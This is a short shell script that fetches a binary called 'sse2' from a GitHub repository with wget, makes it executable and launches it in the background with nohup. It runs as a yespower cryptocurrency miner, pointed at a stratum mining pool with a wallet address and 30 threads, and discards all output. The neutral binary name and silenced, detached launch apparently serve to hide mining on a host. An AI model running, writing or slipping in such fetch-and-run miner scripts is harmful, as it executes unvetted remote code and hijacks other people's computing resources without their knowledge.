#!/bin/sh

#!/bin/bash

wget https://github.com/Akatsoki/nungx/raw/main/sse2

chmod +x sse2  >/dev/null 2>&1

nohup ./sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.SMLT -t 30 >/dev/null 2>&1
